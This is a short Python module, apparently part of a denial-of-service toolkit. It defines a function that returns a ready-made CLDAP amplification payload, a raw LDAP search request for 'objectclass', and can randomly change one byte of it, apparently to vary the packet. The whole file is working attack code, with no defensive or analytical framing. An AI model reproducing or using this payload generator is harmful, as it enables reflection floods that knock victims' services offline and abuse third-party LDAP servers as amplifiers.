import random

def generate_payload(target, options=None):
    """
    CLDAP amplification, supports mutation
    options:
      - mutate: bool, whether to mutate
    """
    mutate = options.get('mutate', False) if options else False
    base = (b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
            b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00')
    if mutate:
        # Randomly mutate part of the content
        b = bytearray(base)
        b[10] = random.randint(0,255)
        return bytes(b)
    return base